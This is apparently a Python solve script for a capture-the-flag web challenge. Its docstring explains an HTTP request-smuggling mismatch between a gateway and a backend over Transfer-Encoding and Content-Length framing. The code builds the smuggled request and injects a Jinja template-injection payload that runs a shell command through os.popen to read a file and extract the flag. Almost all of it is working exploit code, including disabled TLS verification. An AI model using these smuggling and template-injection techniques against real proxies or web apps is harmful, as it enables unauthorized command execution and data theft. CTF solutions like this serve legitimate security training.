#!/usr/bin/env python3
"""Sticky Headers (FortID CTF 2026) - solve.

Mechanism (two version-dependent framing behaviours in the delivery gateway):
  * The gateway chunked-decodes Transfer-Encoding values whose token list ends
    with "chunked" (case-insensitive) for X-Client-Version 0/2/3/99.
  * For X-Client-Version: 1 ("older courier") the gateway does NOT recognise
    "Transfer-Encoding: identity, chunked" and falls back to Content-Length.
  * The backend ("staff system", Python http.server, HTTP/1.0) DOES honour
    chunked framing and uses the gateway's forwarded CL region as the body.
    The two parsers therefore disagree about the body boundary: the outer
    request's chunked body ends early at our zero-chunk, and everything the
    gateway still counts inside Content-Length becomes a second request to the
    backend - /staff/preview.
  * For v1 the gateway also relays the *whole* upstream byte stream instead of
    stopping after the first response, so the smuggled request's response is
    readable in band. (The v1 fast path skips the decoded-body "anti
    double-encoding" scan as well.)

  /staff/preview renders the form field `message` with the shop's Jinja
  template renderer (SSTI), so `{{ os.popen('cat /opt/candy/recipe.txt').read() }}`
  is rendered into the preview page and read back through the smuggled response.
"""
import socket, ssl, sys, re, urllib.parse

def smuggle(host, port, msg, timeout=15.0):
    body = b"message=" + urllib.parse.quote(msg, safe='').encode()
    nested = (b"POST /staff/preview HTTP/1.1\r\nHost: x\r\n"
              b"Content-Type: application/x-www-form-urlencoded\r\n"
              b"Content-Length: " + str(len(body)).encode() + b"\r\n"
              b"Connection: close\r\n\r\n" + body)
    payload = b"0\r\n\r\n" + nested          # v1: gateway frames by CL, backend by chunked
    req = (b"POST /order HTTP/1.1\r\nHost: x\r\nX-Client-Version: 1\r\n"
           b"Content-Type: application/x-www-form-urlencoded\r\n"
           b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
           b"Transfer-Encoding: identity, chunked\r\n\r\n" + payload)
    ctx = ssl._create_unverified_context()
    ctx.set_alpn_protocols(['http/1.1'])
    s = socket.create_connection((host, port), timeout=timeout)
    s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(timeout)
    s.sendall(req)
    buf = b""
    while True:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    s.close()
    return buf

def main():
    if len(sys.argv) < 3:
        sys.exit("usage: solve.py HOST PORT")
    host = sys.argv[1]
    port = int(sys.argv[2])
    payload = "{{cycler.__init__.__globals__.os.popen('cat /opt/candy/recipe.txt').read()}}"
    raw = smuggle(host, port, payload)
    m = re.search(rb'<div class="preview">(.*?)</div>', raw, re.S)
    rendered = m.group(1).decode('utf-8', 'replace') if m else ""
    print(raw.decode('utf-8', 'replace'))          # full in-band capture
    print("PREVIEW RENDER:", rendered)
    fm = re.search(r'FortID\{[^}]*\}', raw.decode('utf-8', 'replace'))
    print("FLAG:", fm.group(0) if fm else "NOT FOUND")
    return 0 if fm else 1

if __name__ == "__main__":
    sys.exit(main())
